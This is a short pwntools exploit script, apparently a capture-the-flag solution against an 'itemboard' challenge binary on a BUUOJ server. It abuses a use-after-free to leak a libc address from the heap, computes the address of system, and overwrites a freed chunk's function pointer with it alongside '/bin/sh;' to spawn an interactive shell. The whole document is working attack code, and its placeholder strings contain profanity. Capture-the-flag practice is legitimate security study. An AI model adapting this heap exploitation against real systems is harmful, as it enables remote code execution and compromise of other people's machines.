from pwn import *
r = remote('node3.buuoj.cn',27529)
#r = process('./itemboard')
elf = ELF('./itemboard')
libc = ELF('/libc-2.23.so')

def add(name,size,des):
	r.sendlineafter('choose','1')
	r.sendlineafter('name',name)
	r.sendlineafter('len',str(size))
	r.sendlineafter('Description?',des)

def list():
	r.sendlineafter('choose','2')

def show(index):
	r.sendlineafter('choose','3')
	r.sendlineafter('Which item?',str(index))

def free(index):
	r.sendlineafter('choose','4')
	r.sendlineafter('Which item?',str(index))

add('fuck',0x400,'wdnmd')
add('fuck',0x40,'wdnmd')
add('fuck',0x40,'wdnmd')
free(0)
show(0)
r.recvuntil('Description:')
main_arena = u64(r.recvuntil('\n',drop=True).ljust(8,'\x00'))-88
libc_base = main_arena-0x3c4b20
log.success(hex(libc_base))
system = libc_base+libc.sym['system']
log.success(hex(system))
free(1)
free(2)
add('aaaa',0x18,'/bin/sh;'+'a'*8+p64(system))
free(1)
r.interactive()